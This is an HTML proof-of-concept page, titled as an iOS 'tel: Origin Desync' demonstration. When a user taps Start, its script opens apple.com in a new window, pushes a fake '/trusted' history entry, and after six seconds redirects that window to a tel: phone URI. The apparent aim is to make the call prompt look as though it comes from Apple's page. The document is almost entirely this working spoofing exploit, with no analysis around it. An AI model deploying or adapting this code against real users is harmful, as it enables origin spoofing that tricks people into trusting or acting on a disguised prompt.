<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>iOS tel: Origin Desync PoC</title>

<style>
body {
  font-family:-apple-system,system-ui;
  height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  background:#f5f5f7;
}
button {
  font-size:20px;
  padding:14px 24px;
  border:none;
  border-radius:12px;
  background:#007aff;
  color:white;
}
</style>
</head>

<body>

<button id="go">Start</button>

<script>
let w;

document.getElementById('go').onclick = () => {

  // 1️⃣ Open trusted-looking page in new window
  w = window.open("https://apple.com", "_blank");

  // 2️⃣ Store activation state
  history.pushState({}, "", "/trusted");

  // 3️⃣ Wait until user interacts on new page
  setTimeout(() => {
    try {
      // 🔥 External protocol AFTER navigation
      w.location = "tel:123456";
    } catch(e){}
  }, 6000);
};
</script>

</body>
</html>
